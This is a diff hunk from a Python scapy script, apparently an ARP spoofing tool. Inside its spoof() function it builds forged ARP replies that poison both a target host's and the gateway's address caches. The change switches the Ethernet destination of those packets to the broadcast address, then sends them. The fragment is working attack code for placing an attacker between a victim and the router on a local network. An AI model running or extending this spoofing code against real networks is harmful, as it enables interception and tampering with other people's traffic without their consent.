@@ -76,8 +76,8 @@ def spoof():
                 target_mac = spoof_list[target_ip]
                 spoof_mac = spoof_list["gateway"]
                 spoof_ip = ".".join(target_ip.split(".")[:-1])+".1"
-                packet_to_target = scapy.Ether(dst=spoof_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-                packet_to_router = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
+                packet_to_target = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+                packet_to_router = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
                 if target_ip in all_ip:
                     print(f"Spoof {target_ip}")
                     scapy.sendp([packet_to_target, packet_to_router])
